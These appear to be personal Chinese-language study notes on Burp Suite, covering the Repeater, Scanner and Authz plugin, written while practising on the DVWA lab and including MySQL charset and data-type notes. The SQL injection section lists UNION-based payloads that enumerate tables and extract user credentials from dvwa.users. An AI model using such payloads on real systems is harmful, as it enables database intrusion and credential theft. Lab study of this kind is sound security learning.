1.repeater的“send”和“send to  new tab"功能
2.Burp Scanner教程
自己在扫描DVWA时观察到很明显的危险信号 
phpinfo.php-高危信息泄露（攻击可以获取系统路径，版本信息；可能泄露数据库密码，API密钥，反正是不应该被扫描出来的）
logout.php-认证机制（这个用户退出登录系统的地方，可能存在会话管理问题，是测试认证绕过的重点目标）
值得测试的请求=任何用户可以输入数据的地方
{
URL中的？参数=值
登录表单的用户名密码
搜索框的搜索关键词
文件上传的文件选择
任何可以填写的文本框
}
3.在Burp repeater中
### DVWA SQL注入实验
确认注入点（‘）
确定字段数量（’ order by 2--)
寻找回显点（‘ union select 1，2--）
获取数据库信息（’ union select database(),version()--)
了解所有表名（‘ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--)
如果遇到字符集冲突，则绕过字符集（’ union select null,concat(user,0x3a,password)from dvwa.users)
null:避免数据类型冲突
concat:可以将两个字段合并成一个
0x3a:冒号的16进制
4.认识数据库的字符集与排序规则
字符集：定义了字符和编码的映射关系
排序规则：是同一字符集内，比较字符排序方式的规则集合
在MYSQL中，字符集是分层的，优先级从高到低：**字段 > 表 > 数据库 > 数据库配置文件**[]
数据类型：字符串类型：用于存储文本信息
					**CHAR(n)**：**固定长度**的字符串。
					 **VARCHAR(n)**：**可变长度**的字符串
		 数值类型：用于存储数字。
				 整数类型：如`TINYINT`、`SMALLINT`、`INT`（常用）、`BIGINT`等，区别在于存储空间和数值范围[](https://www.yisu.com/ask/99962407.html)。
				 精确数值类型：如`DECIMAL(p,s)`或`NUMERIC(p,s)`，用于存储需要精确小数位的数字，如财务数据。`p`代表总位数，`s`代表小数位数[](https://www.yisu.com/ask/99962407.html)。
		 日期时间类型：如`DATE`（日期）、`TIME`（时间）、`DATETIME`（日期和时间）[](https://www.yisu.com/ask/99962407.html)- 
-            二进制类型：用于存储二进制数据，如图片、文件或哈希值[](https://www.yisu.com/ask/99962407.html)
#### Authz插件使用
1.**核心任务**：检查你用A用户身份发起的请求，如果换成用户B的身份凭证去访问，是否还能得到相同的数据或操作成功。如果是，那就存在**越权漏洞**[](https://blog.csdn.net/weixin_33736666/article/details/113376904)。
 2.**工作方式**：Authz通过修改HTTP请求中的身份认证信息（最典型的就是**Cookie**），然后对比替换前后的**响应长度**和**状态码**来判断是否存在漏洞[](https://blog.csdn.net/weixin_33736666/article/details/113376904)。   

